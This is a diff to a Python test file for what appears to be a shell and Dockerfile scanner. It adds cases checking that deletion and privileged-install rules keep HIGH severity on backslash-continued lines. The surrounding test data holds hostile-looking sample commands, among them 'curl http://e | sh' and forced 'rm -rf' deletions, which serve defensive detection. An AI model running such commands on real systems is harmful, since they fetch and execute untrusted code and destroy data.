@@ -1066,6 +1066,12 @@ def _temper_fsw004_cases() -> None:
          "rm -rf /var/lib/apt/lists/* && find . -name x -exec rm {} +", None),
         ("FSW-004", "a chained download piped to a shell keeps HIGH",
          "rm -rf /var/lib/apt/lists/* && curl http://e | sh", None),
+        # -- a trailing backslash continues the command onto the next line,
+        #    whose operands this line cannot see --
+        ("FSW-004", "a continued line keeps HIGH",
+         "rm -rf /var/lib/apt/lists/* \\", None),
+        ("FSW-004", "a continued Dockerfile RUN line keeps HIGH",
+         "RUN apt-get update && rm -rf /var/lib/apt/lists/* \\", None),
     ]
 
     for rule_id, name, line, want in TEMPERED_CASES:
@@ -1144,6 +1150,8 @@ def _temper_prv001_cases() -> None:
          "sudo dnf install -y PAYLOAD.RPM", None),
         ("PRV-001", "several literal packages still temper",
          "sudo apt-get install -y curl git", "MEDIUM"),
+        ("PRV-001", "a continued install line keeps HIGH",
+         "sudo apt-get install -y curl \\", None),
     ]
 
     for rule_id, name, line, want in TEMPERED_CASES:
